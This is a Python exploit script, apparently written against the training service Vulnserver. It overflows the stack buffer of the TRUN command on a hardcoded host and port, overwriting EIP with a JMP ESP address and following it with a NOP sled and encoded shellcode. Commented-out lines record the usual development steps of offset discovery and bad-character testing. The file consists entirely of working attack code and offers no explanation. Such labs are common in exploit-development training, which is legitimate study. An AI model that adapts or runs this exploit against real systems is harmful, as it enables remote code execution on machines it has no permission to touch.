#!/uusr/bin/env python3

import socket
import struct


#all_characters =b"".join([struct.pack("<B", x) for x in range(1,256)])
#b'\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'


buf =  b""
buf += b"\xbf\xc7\x7d\x41\xb4\xdb\xc9\xd9\x74\x24\xf4\x5d\x2b"
buf += b"\xc9\xb1\x59\x83\xc5\x04\x31\x7d\x10\x03\x7d\x10\x25"
buf += b"\x88\xbd\x5c\x26\x73\x3e\x9d\x58\x45\xec\x14\x7d\xc1"
buf += b"\x9b\x75\x4d\x81\xce\x75\x26\xc7\xfa\x0e\x4a\xc0\x33"
buf += b"\xee\xa5\xa7\x7e\x36\x88\x07\xd2\x0a\x8b\xfb\x29\x5f"
buf += b"\x6b\xc5\xe1\x92\x6a\x02\xb4\xd9\x83\xde\x10\xa9\x09"
buf += b"\xcf\x15\xef\x91\xee\xf9\x7b\xa9\x88\x7c\xbb\x5d\x25"
buf += b"\x7e\xec\x16\xfd\x98\x5c\xa3\xa6\xb8\x5d\x60\xd3\x70"
buf += b"\x29\xba\x95\x09\xe6\x49\x24\xd8\x36\xb2\x16\x24\xf9"
buf += b"\x83\x54\x08\xfb\xdc\x5f\xb0\x89\x16\x9c\x4d\x8a\xed"
buf += b"\xde\x89\x1f\xf1\x79\x59\x87\xd5\x78\x8e\x5e\x9e\x77"
buf += b"\x7b\x14\xf8\x9b\x7a\xf9\x73\xa7\xf7\xfc\x53\x21\x43"
buf += b"\xdb\x77\x69\x17\x42\x2e\xd7\xf6\x7b\x30\xbf\xa7\xd9"
buf += b"\x3b\x52\xb1\x5e\xc4\xac\xbe\x02\x52\x60\x73\xbd\xa2"
buf += b"\xee\x04\xce\x90\xb1\xbe\x58\x98\x3a\x19\x9e\xa9\x2d"
buf += b"\x9a\x70\x11\x3d\x64\x71\x61\x17\xa3\x25\x31\x0f\x02"
buf += b"\x46\xda\xcf\xab\x93\x76\xda\x3b\xdc\x2e\xbe\xb2\xb4"
buf += b"\x2c\x3f\xd4\x18\xb9\xd9\x86\xf0\xe9\x75\x67\xa1\x49"
buf += b"\x26\x0f\xab\x46\x19\x2f\xd4\x8d\x32\xda\x3b\x7b\x6a"
buf += b"\x73\xa5\x26\xe0\xe2\x2a\xfd\x8c\x25\xa0\xf7\x71\xeb"
buf += b"\x41\x72\x62\x1c\x36\x7c\x7a\xdd\xd3\x7c\x10\xd9\x75"
buf += b"\x2b\x8c\xe3\xa0\x1b\x13\x1b\x87\x18\x54\xe3\x56\x28"
buf += b"\x2e\xd2\xcc\x14\x58\x1b\x01\x94\x98\x4d\x4b\x94\xf0"
buf += b"\x29\x2f\xc7\xe5\x35\xfa\x74\xb6\xa3\x05\x2c\x6a\x63"
buf += b"\x6e\xd2\x55\x43\x31\x2d\xb0\xd7\x36\xd1\x46\xf0\x9e"
buf += b"\xb9\xb8\x40\x1f\x39\xd3\x40\x4f\x51\x28\x6e\x60\x91"
buf += b"\xd1\xa5\x29\xb9\x58\x28\x9b\x58\x5c\x61\x7d\xc4\x5d"
buf += b"\x86\xa6\xf7\x24\xe7\x59\xf8\xd8\xe1\x3d\xf9\xd8\x0d"
buf += b"\x40\xc6\x0e\x34\x36\x09\x93\x03\x49\x3c\xb6\x22\xc0"
buf += b"\x3e\xe4\x35\xc1"

shellcode = buf

s = socket.socket()
s.connect(("192.168.100.25", 9999))
total_length =2984
offset = 2003
#new_eip = b"BBBB"
new_eip = struct.pack("<I", 0x62501203)
#new_eip = b'\x03\x12Pb'
nop_sled = b"\x90" * 8
payload = [
    b"TRUN /.:/",
    #b"A" * total_length
    #b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv"
    b"A" * offset,
    new_eip,
    #b"C" * (total_length - offset - len(new_eip)) #977
    #all_characters,
    nop_sled,
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode))
    
]

payload = b"".join(payload)

s.send(payload)
s.close()